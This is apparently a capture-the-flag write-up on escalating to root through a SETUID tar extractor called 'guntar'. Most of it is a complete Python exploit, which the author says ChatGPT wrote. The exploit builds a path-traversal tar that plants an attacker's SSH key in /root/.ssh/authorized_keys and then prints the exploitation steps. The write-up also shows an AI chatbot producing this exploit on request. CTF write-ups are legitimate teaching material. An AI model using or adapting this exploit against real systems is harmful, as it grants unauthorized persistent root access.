# TarPit Fall
By @thelkdo

In this challenge you were provided a system with Guntar installed. Exploring around, no flag can be found. We assume it must be in the inaccesible `/root` directory.

By checking the system we find that guntar has SETUID.

Exploring guntar, it has features to explore and extract tar-files. Because of the SETUID bit, all files extracted will be written as root.

By creating a malicious-tar file with path traversal, it is possible to make guntar write a file anywhere as root. Since we're connected to the machine over SSH, lets inject a `authorized_keys` file into roots `.ssh` folder. 

I had ChatGPT write this python script to create the malicious tar-file.

```python
#!/usr/bin/env python
"""
SSH Key Injection Exploit for Guntar Path Traversal

Since guntar runs with SETUID root, we can write to /root/.ssh/authorized_keys!

Strategy:
1. Generate an SSH key pair (or use existing)
2. Create a tar with path traversal to /root/.ssh/
3. Include our public key in authorized_keys
4. SSH in as root: ssh -i private_key root@target
5. Read the flag: cat /root/flag.txt
"""

import tarfile
import io
import os
import subprocess

def create_ssh_exploit():
    """
    Create a tar file that writes our SSH public key to /root/.ssh/authorized_keys
    """

    print("[*] SSH Key Injection Exploit for Guntar")
    print("="*70)

    # Check if we have an existing SSH key, or generate one
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa.pub")

    if os.path.exists(ssh_key_path):
        print(f"[+] Found existing SSH public key: {ssh_key_path}")
        with open(ssh_key_path, 'rb') as f:
            public_key = f.read()
        print(f"[+] Using existing key")
    else:
        print("[!] No SSH key found. Generating one...")
        print("[*] Run: ssh-keygen -t rsa -b 4096 -f ./exploit_key -N ''")
        subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-f', './exploit_key', '-N', ''])
        with open('./exploit_key.pub', 'rb') as f:
            public_key = f.read()
        print(f"[+] Generated new key pair: ./exploit_key and ./exploit_key.pub")

    print(f"[+] Public key content:\n{public_key.decode().strip()}")

    # Create the exploit tar file
    tar_filename = "exploit_ssh.tar"

    with tarfile.open(tar_filename, "w") as tar:
        # Add root directory (required by guntar)
        root_info = tarfile.TarInfo(name="./")
        root_info.type = tarfile.DIRTYPE
        root_info.mode = 0o755
        tar.addfile(root_info)

        # Path traversal to /root/.ssh/
        # From ./extracted, we need to traverse up to reach /root
        # Assuming we're in /home/user/somedir:
        # ./extracted/../../../../root/.ssh -> /home/user/somedir/extracted/../../../../root/.ssh
        # This should resolve to /root/.ssh

        ssh_parent_path = "../../../../root/.ssh"

        # Add all parent directories
        # We need: ../../../../root/ and ../../../../root/.ssh/

        # First level: ../
        for i in range(1, 5):
            dir_path = "../" * i
            dir_info = tarfile.TarInfo(name=dir_path.rstrip('/') + "/")
            dir_info.type = tarfile.DIRTYPE
            dir_info.mode = 0o755
            tar.addfile(dir_info)

        # Add ../../../../root/
        root_dir = tarfile.TarInfo(name="../../../../root/")
        root_dir.type = tarfile.DIRTYPE
        root_dir.mode = 0o700
        tar.addfile(root_dir)

        # Add ../../../../root/.ssh/
        ssh_dir = tarfile.TarInfo(name=ssh_parent_path + "/")
        ssh_dir.type = tarfile.DIRTYPE
        ssh_dir.mode = 0o700
        tar.addfile(ssh_dir)

        # Add the authorized_keys file with our public key
        auth_keys_info = tarfile.TarInfo(name=ssh_parent_path + "/authorized_keys")
        auth_keys_info.type = tarfile.REGTYPE
        auth_keys_info.size = len(public_key)
        auth_keys_info.mode = 0o600  # Important: correct permissions for SSH
        tar.addfile(auth_keys_info, io.BytesIO(public_key))

        print(f"\n[+] Created {tar_filename}")
        print(f"[*] This will write to: /root/.ssh/authorized_keys")

    # Verify tar contents
    print(f"\n[*] Tar contents:")
    with tarfile.open(tar_filename, "r") as tar:
        for member in tar.getmembers():
            print(f"    {member.name} (type: {member.type}, mode: {oct(member.mode)})")

    print("\n" + "="*70)
    print("EXPLOITATION STEPS:")
    print("="*70)
    print("1. Transfer exploit_ssh.tar to the target system")
    print("2. Run: ./guntar extract exploit_ssh.tar")
    print("3. SSH as root:")
    if os.path.exists(ssh_key_path):
        print(f"   ssh -i ~/.ssh/id_rsa root@<target_ip>")
    else:
        print(f"   ssh -i ./exploit_key root@<target_ip>")
    print("4. Read the flag:")
    print("   cat /root/flag.txt")
    print("="*70)

if __name__ == "__main__":
    create_ssh_exploit()
```

From there, we can simply use the generated ssh-keys to login as root!

